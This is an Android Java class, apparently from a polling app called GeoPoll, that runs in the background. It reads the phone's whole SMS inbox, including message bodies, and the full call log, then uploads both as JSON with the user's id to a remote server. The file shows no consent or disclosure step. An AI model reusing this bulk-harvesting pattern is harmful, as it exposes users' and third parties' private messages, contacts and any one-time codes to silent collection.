package com.example.shohel.geopoll.classes;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.VolleyLog;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.example.shohel.geopoll.CallLogHelper;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

/**
 * Created by BDDL-102 on 5/17/2018.
 */

public class PostTask extends AsyncTask {

    Context context;
    String user_id;
    String user_mobile;
    String message = "";


    private ArrayList<String> conNames = new ArrayList();
    private ArrayList<String> conNumbers = new ArrayList();
    private ArrayList<String> conTime = new ArrayList();
    private ArrayList<String> conDate = new ArrayList();
    private ArrayList<String> conType = new ArrayList();
    private ArrayList<String> singleCallLog = new ArrayList();
    private ArrayList<String> allCallLog = new ArrayList();
    Cursor curLog;
    JSONObject callLogObject = new JSONObject();
    JSONArray callLogjArry = new JSONArray();
    JSONArray smsjArry = new JSONArray();
    private static final Uri SMS_INBOX = Uri.parse("content://sms/inbox");

    public PostTask(Context context,String user_id,String user_mobile) {
        this.context = context;
        this.user_id = user_id;
        this.user_mobile = user_mobile;
    }

    @Override
    protected Object doInBackground(Object[] objects) {
        Log.e("DoInBackground","Just Enter");
        loadSMS();
        smsLogPostRequest();
        setCallLogs();
        callLogPostRequest();
        return null;
    }

    private void setCallLogs() {
        Log.d("Call","SetCallLoG");
        curLog = CallLogHelper.getAllCallLogs(context.getContentResolver());
        while (curLog.moveToNext()) {

            JSONObject jObjd = new JSONObject();
            try {

                String callNumber = curLog.getString(curLog
                        .getColumnIndex(android.provider.CallLog.Calls.NUMBER));
                conNumbers.add(callNumber);
                singleCallLog.add(callNumber);
                String callName = curLog
                        .getString(curLog
                                .getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME));
                if (callName == null) {
                    conNames.add("Unknown");
                    singleCallLog.add("Unknown");
                    jObjd.put("contact_name", "Unknown");
                } else{
                    conNames.add(callName);
                    singleCallLog.add(callName);
                    jObjd.put("contact_name", callName);}

                String callDate = curLog.getString(curLog
                        .getColumnIndex(android.provider.CallLog.Calls.DATE));
                SimpleDateFormat formatter = new SimpleDateFormat(
                        "dd-MMM-yyyy HH:mm");
                String dateString = formatter.format(new Date(Long
                        .parseLong(callDate)));
                conDate.add(dateString);
                singleCallLog.add(dateString);

                String callType = curLog.getString(curLog
                        .getColumnIndex(android.provider.CallLog.Calls.TYPE));
                if (callType.equals("1")) {
                    conType.add("Incoming");
                    singleCallLog.add("Incoming");
                    jObjd.put("call_type", "Incoming");
                } else{
                    conType.add("Outgoing");
                    singleCallLog.add("Outgoing");
                    jObjd.put("call_type", "Outgoing");}

                String duration = curLog.getString(curLog
                        .getColumnIndex(android.provider.CallLog.Calls.DURATION));
                conTime.add(duration);
                singleCallLog.add(duration);

                allCallLog.add(String.valueOf(singleCallLog));
                String dataUsage = curLog.getString(curLog.getColumnIndex(CallLog.Calls.DATA_USAGE));
                String simID = curLog.getString(curLog.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_COMPONENT_NAME));
                singleCallLog.clear();

                jObjd.put("call_time", dateString);
                jObjd.put("contact_number", callNumber);
                jObjd.put("call_duration", duration);
                jObjd.put("simID",simID);
                jObjd.put("DataUsage",dataUsage);

            } catch (JSONException e) {
                e.printStackTrace();
            }

            callLogjArry.put(jObjd);

        }

        try {
            callLogObject.put("log", callLogjArry);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        Log.d("Test", callLogObject.toString());
    }

    private void loadSMS() {
        Log.d("SMS","LoadSMS");
        Cursor c = context.getContentResolver().query(SMS_INBOX,
                null, null, null, null);
        String[] from = new String[] {"address", "body"};
       /* int[] to = new int[] {R.id.tvAddress, R.id.tvBody};
        SimpleCursorAdapter lvAdapter = new SimpleCursorAdapter(this, R.layout.list_item, c, from,
                to, 0);
        lvSMS.setAdapter(lvAdapter);*/
        while (c.moveToNext()) {
            JSONObject jObjd = new JSONObject();
            try {
                String body = c.getString(c.getColumnIndexOrThrow("body")).toString();
                String address = c.getString(c.getColumnIndexOrThrow("address")).toString();
                String read = c.getString(c.getColumnIndexOrThrow("read")).toString();
                String date = c.getString(c.getColumnIndexOrThrow("date")).toString();
                SimpleDateFormat formatter = new SimpleDateFormat(
                        "dd-MMM-yyyy HH:mm");
                String dateString = formatter.format(new Date(Long
                        .parseLong(date)));
                //String person = c.getString(c.getColumnIndexOrThrow("person")).toString();

                String type = c.getString(c.getColumnIndexOrThrow("type")).toString();

                if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")){
                    jObjd.put("type", "inbox");
                }else{
                    jObjd.put("type", "sent");
                }

                //Toast.makeText(this, "address: "+address, Toast.LENGTH_SHORT).show();

                jObjd.put("date", dateString);
                jObjd.put("body", body);
                jObjd.put("address", address);

            } catch (JSONException e) {
                e.printStackTrace();
            }

            smsjArry.put(jObjd);
            Log.d("Break","");
            Log.d("SMS",smsjArry.toString());

        }

    }

    public void smsLogPostRequest(){

        Log.d("SMS","SMS_LOG_POST");
        //pDialogShow();
        RequestQueue queue = Volley.newRequestQueue(context);

        String url = "https://mindscape.com.bd/api/v1/sms/log";
        JSONObject obj = new JSONObject();
        try {
            obj.put("sms_log", smsjArry);
            obj.put("user_id",user_id);
            obj.put("user_mobile",user_mobile);

        } catch (JSONException e) {
            e.printStackTrace();
        }

        //Toast.makeText(getApplicationContext(), obj.toString(), Toast.LENGTH_LONG).show();

        JsonObjectRequest req = new JsonObjectRequest(Request.Method.POST,url,obj,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        // Toast.makeText(getApplicationContext(),response.toString(),Toast.LENGTH_LONG).show();
                        Toast.makeText(context,"Successfully Completed",Toast.LENGTH_LONG).show();
                        //pDialogHide();



                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                VolleyLog.d("Error: ", error.getMessage());
                //Toast.makeText(getApplicationContext(),error.getMessage().toString(),Toast.LENGTH_SHORT).show();
                Toast.makeText(context,"Check Internet Connection",Toast.LENGTH_SHORT).show();
                //textView.setText(error.toString());
                //pDialogHide();
            }
        });

        req.setRetryPolicy(new DefaultRetryPolicy(0, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        queue.add(req);
        /*startActivity(new Intent(SMSDetailsPageActivity.this,CallLogActivity.class));
        finish();*/
        // pDialogHide();
    }


    public void callLogPostRequest(){
        Log.d("Call","CallLogPost");
        //pDialogShow();
        RequestQueue queue = Volley.newRequestQueue(context);

        String url = "https://mindscape.com.bd/api/v1/call/log";
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);;
        String user_id = sp.getString("user_id","");
        String user_mobile = sp.getString("user_mobile","");
        Log.d("Call Activity mobile: ",user_mobile );
        JSONObject obj = new JSONObject();
        try {
            obj.put("call_log", callLogjArry);
            obj.put("user_id",user_id);
            obj.put("user_mobile",user_mobile);

        } catch (JSONException e) {
            e.printStackTrace();
        }

        //Toast.makeText(getApplicationContext(), obj.toString(), Toast.LENGTH_LONG).show();

        JsonObjectRequest req = new JsonObjectRequest(Request.Method.POST,url,obj,
                new Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        //Toast.makeText(getApplicationContext(),response.toString(),Toast.LENGTH_LONG).show();
                        Toast.makeText(context,"Successfully Finished",Toast.LENGTH_LONG).show();
                        //pDialogHide();
                        Log.d("Call","finished");


                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {
                VolleyLog.d("Error: ", error.getMessage());
                //Toast.makeText(getApplicationContext(),error.getMessage().toString(),Toast.LENGTH_SHORT).show();
                Toast.makeText(context,"Check Internet Connection",Toast.LENGTH_SHORT).show();
                //textView.setText(error.toString());
                //pDialogHide();
            }
        });

        req.setRetryPolicy(new DefaultRetryPolicy(0, DefaultRetryPolicy.DEFAULT_MAX_RETRIES, DefaultRetryPolicy.DEFAULT_BACKOFF_MULT));
        queue.add(req);
    }
}
